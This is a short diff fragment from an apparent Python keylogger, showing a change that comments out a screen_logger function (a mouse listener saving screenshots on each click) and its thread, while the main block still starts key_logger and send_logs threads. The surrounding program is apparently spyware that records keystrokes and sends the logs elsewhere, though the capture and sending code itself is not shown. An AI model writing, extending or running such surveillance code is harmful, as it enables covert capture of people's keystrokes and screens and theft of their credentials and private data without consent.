@@ -144,15 +144,15 @@ def key_logger():
             pass
 
 
-def screen_logger():
-    with m_Listener(on_click=save_screenshot) as m_listen:
-        try:
-            m_listen.join()
-        except:
-            pass
+# def screen_logger():
+#     with m_Listener(on_click=save_screenshot) as m_listen:
+#         try:
+#             m_listen.join()
+#         except:
+#             pass
 
 
 if __name__ == '__main__':
     threading.Thread(target=key_logger).start()
-    threading.Thread(target=screen_logger).start()
+    # threading.Thread(target=screen_logger).start()
     threading.Thread(target=send_logs).start()
